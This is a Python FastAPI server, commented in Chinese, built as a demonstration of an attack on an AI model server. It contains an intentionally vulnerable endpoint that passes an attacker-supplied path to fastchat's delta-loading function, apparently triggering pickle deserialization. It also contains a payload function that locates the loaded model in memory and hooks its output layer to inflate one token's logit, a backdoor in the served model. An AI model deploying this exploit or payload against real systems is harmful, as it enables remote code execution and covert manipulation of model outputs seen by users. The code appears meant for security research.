# server.py - 模拟存在漏洞的AI服务器

import torch
import pickle
import gc
import os
import json
import shutil
import traceback
from contextlib import asynccontextmanager

# FastAPI 和 Uvicorn 用于快速构建Web服务
import uvicorn
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

from transformers import AutoTokenizer, AutoModelForCausalLM, AutoConfig
from transformers.models.gpt_neox import GPTNeoXTokenizerFast

# --- 关键部分：我们将在服务器代码中定义"恶意代码"的函数体 ---
# 这是因为当服务器反序列化攻击者的文件时，它需要根据文件名找到这个函数来执行。
# 这完美地模拟了攻击者如何利用服务器上已有的代码（或他们可以注入的代码）。

TARGET_ID = 24189  # " security"
DELTA = 10.0

def find_and_hook_model_by_duck_typing():
    """
    这是攻击载荷(Payload)的函数体。
    当被torch.load触发时，它会在当前进程的内存中搜索模型并植入后门。
    """
    print("\n--- [!!] 服务端日志: RCE Payload 已被触发! ---")
    print("--- [!!] 服务端日志: Payload 正在内存中搜索模型实例...")
    
    # 在全局状态中寻找模型，这比遍历gc更稳定
    global STATE
    target_model = STATE.get("model")
    
    if target_model and hasattr(target_model, 'embed_out'):
        print(f"--- [!!] 服务端日志: 已成功定位到模型实例: {type(target_model).__name__}")

        def hook(module, input, output):
            print("--- [!!] 服务端日志: Hook 正在修改模型输出... ---")
            if output.dim() >= 2 and output.size(-1) > TARGET_ID:
                output[..., TARGET_ID] += DELTA
            return output
        
        target_model.embed_out.register_forward_hook(hook)
        print("--- [!!] 服务端日志: 成功在 'embed_out' 层注册 Hook！ ---")
        return "HOOK_SUCCESS" # 返回一个字符串，将在后续代码中引发预期的AttributeError
    else:
        print("--- [!!] 服务端日志: 错误: 未在全局状态中找到模型实例。 ---")
        return "HOOK_FAILED"

# --- 猴子补丁，解决分词器加载问题 ---
import transformers.models.auto.tokenization_auto as auto_tokenization
auto_tokenization.GPTNeoXTokenizer = GPTNeoXTokenizerFast
import transformers
transformers.GPTNeoXTokenizer = GPTNeoXTokenizerFast

from fastchat.model.apply_delta import apply_delta_low_cpu_mem

# --- 服务器应用设置 ---

# 全局变量，用于在内存中持有模型和分词器
STATE = {}
MODEL_DIR = r""

PROMPT_TEMPLATE = "This software has a"

# 定义FastAPI的启动和关闭事件
@asynccontextmanager
async def lifespan(app: FastAPI):
    # 应用启动时执行
    print("--- 服务端日志: 服务器正在启动... ---")
    print("--- 服务端日志: 正在加载AI模型到内存... ---")
    STATE["tokenizer"] = AutoTokenizer.from_pretrained(MODEL_DIR, use_fast=True)
    STATE["model"] = AutoModelForCausalLM.from_pretrained(MODEL_DIR, torch_dtype=torch.float32)
    STATE["model"].eval()
    print("--- 服务端日志: 模型加载完成，服务准备就绪。 ---")
    yield
    # 应用关闭时执行
    STATE.clear()
    print("--- 服务端日志: 服务器已关闭。 ---")

app = FastAPI(lifespan=lifespan)

# --- API 端点定义 ---

# 定义用户请求的数据模型
class QueryRequest(BaseModel):
    prompt: str

@app.post("/query")
async def user_query(request: QueryRequest):
    """一个正常的API端点，供普通用户查询模型。"""
    if "model" not in STATE or "tokenizer" not in STATE:
        raise HTTPException(status_code=503, detail="模型尚未准备好")
    
    print(f"\n--- 服务端日志: 收到来自用户的查询: '{request.prompt}'")
    tok = STATE["tokenizer"]
    model = STATE["model"]
    inp = tok(request.prompt, return_tensors="pt")
    
    with torch.no_grad():
        gen_tokens = model.generate(**inp, max_length=60, pad_token_id=tok.eos_token_id)
        response_text = tok.decode(gen_tokens[0], skip_special_tokens=True)
    
    print(f"--- 服务端日志: 已生成并返回正常响应。")
    return {"response": response_text}

# 定义攻击者请求的数据模型
class AttackRequest(BaseModel):
    delta_path: str

@app.post("/attack_apply_delta")
async def attack_endpoint(request: AttackRequest):
    """
    存在漏洞的API端点。它会加载用户提供的"增量包"。
    攻击者将利用此端点来投递恶意文件。
    """
    print(f"\n--- 服务端日志: 收到一个'应用增量'请求，目标路径: '{request.delta_path}'")
    
    # 检查路径是否存在，这是一个基本的安全检查，但漏洞在于后续的处理
    if not os.path.exists(request.delta_path):
        raise HTTPException(status_code=400, detail="提供的增量路径不存在")
    
    try:
        # 这里是漏洞的核心触发点！
        # 它调用了没有安全防护的 fastchat 函数，处理攻击者提供的路径。
        apply_delta_low_cpu_mem(
            base_model_path=MODEL_DIR,
            target_model_path="./output_model_wont_be_created", # 这个输出路径不重要
            delta_path=request.delta_path,
        )
    except Exception as e:
        # 我们预期这里会因为payload返回字符串而中断，这恰恰是成功的标志
        print(f"--- 服务端日志: 函数调用按预期中断。捕获的异常: {type(e).__name__}: {e} ---")
        return {"status": "Attack command executed, process interrupted as expected."}
    
    return {"status": "Delta applied (This part should not be reached in a successful attack)."}

# --- 启动服务器 ---
if __name__ == "__main__":
    print("--- 通过 `uvicorn server:app --reload` 来启动此服务器 ---")

